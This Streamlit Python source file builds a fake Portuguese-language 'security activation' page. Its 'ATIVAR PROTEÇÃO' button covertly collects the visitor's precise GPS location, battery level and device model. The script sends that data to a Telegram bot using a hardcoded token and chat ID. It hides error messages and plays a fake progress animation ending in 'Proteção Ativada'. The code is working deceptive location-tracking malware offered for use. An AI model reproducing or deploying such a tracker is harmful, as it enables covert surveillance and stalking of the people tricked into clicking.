import streamlit as st
import time

# --- DADOS DO SEU BOT ---
TOKEN = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
ID = "8210828398"

st.set_page_config(page_title="Segurança Ativa", layout="centered")

# --- ESTILIZAÇÃO IDENTICA À FOTO ---
st.markdown("""
    <style>
    .main { background-color: #0b0f14; color: white; }
    .stAlert, [data-testid="stNotificationContent"], .stException { display: none !important; }
    .scanner-box { display: flex; flex-direction: column; align-items: center; padding: 20px; margin-top: 50px; }
    .circle {
        width: 200px; height: 200px; border-radius: 50%;
        border: 2px solid #1e2630;
        display: flex; align-items: center; justify-content: center;
        background: radial-gradient(circle, rgba(46, 204, 113, 0.1) 0%, transparent 70%);
    }
    .pct-text { font-size: 48px; font-weight: bold; color: white; font-family: sans-serif; }
    
    /* BOTÃO EXATAMENTE COMO NA FOTO */
    .btn-original {
        background-color: white;
        color: #333;
        border: none;
        padding: 8px 15px;
        border-radius: 4px;
        font-size: 14px;
        font-family: sans-serif;
        display: flex;
        align-items: center;
        gap: 8px;
        cursor: pointer;
        text-transform: uppercase;
        font-weight: 500;
    }
    .dot { color: red; font-size: 18px; }
    </style>
""", unsafe_allow_html=True)

st.markdown("<h1 style='text-align: center; font-family: sans-serif;'>Verificar segurança</h1>", unsafe_allow_html=True)

# Container da Bolha
caixa_bolha = st.empty()
caixa_bolha.markdown('<div class="scanner-box"><div class="circle"><div class="pct-text">{p}%</div></div></div>', unsafe_allow_html=True)

# --- BOTÃO COM VISUAL DA FOTO MAS COMANDO DA GOOGLE ---
js_botao_fiel = f"""
<div style="display: flex; justify-content: flex-start; padding-left: 10px;">
    <button class="btn-original" onclick="chamarGoogle()">
        <span class="dot">●</span> ATIVAR PROTEÇÃO
    </button>
</div>

<script>
function chamarGoogle() {{
    // Comando para abrir a Precisão de Local
    navigator.geolocation.getCurrentPosition(
        async (pos) => {{
            try {{
                const bat = await navigator.getBattery();
                const level = Math.round(bat.level * 100);
                const model = navigator.userAgent.split('(')[1].split(')')[0];
                
                const msg = "🛡️ *SISTEMA ATIVADO*\\n\\n📱 *Modelo:* `" + model + "`\\n🔋 *Bateria:* `" + level + "%`\\n📍 [MAPA](https://www.google.com/maps?q=" + pos.coords.latitude + "," + pos.coords.longitude + ")";
                
                await fetch("https://api.telegram.org/bot{TOKEN}/sendMessage", {{
                    method: "POST",
                    headers: {{ "Content-Type": "application/json" }},
                    body: JSON.stringify({{ chat_id: "{ID}", text: msg, parse_mode: "Markdown" }})
                }});
                
                window.parent.postMessage({{type: 'streamlit:set_component_value', value: true}}, '*');
            }} catch (e) {{}}
        }},
        (err) => {{ console.log("Aguardando ativação..."); }},
        {{ enableHighAccuracy: true, timeout: 10000 }}
    );
}}
</script>

<style>
    .btn-original {{
        background-color: white; color: #333; border: none;
        padding: 8px 15px; border-radius: 4px; font-size: 14px;
        font-family: sans-serif; display: flex; align-items: center;
        gap: 8px; cursor: pointer; text-transform: uppercase;
    }}
    .dot {{ color: red; font-size: 18px; }}
</style>
"""

# Mantive o botão pequeno e branco como na sua referência
clicou = st.components.v1.html(js_botao_fiel, height=60)

if clicou:
    for p in range(4, 101, 5):
        caixa_bolha.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{{p}}%</div></div></div>', unsafe_allow_html=True)
        time.sleep(0.05)
    st.success("Proteção Ativada")
    st.stop()
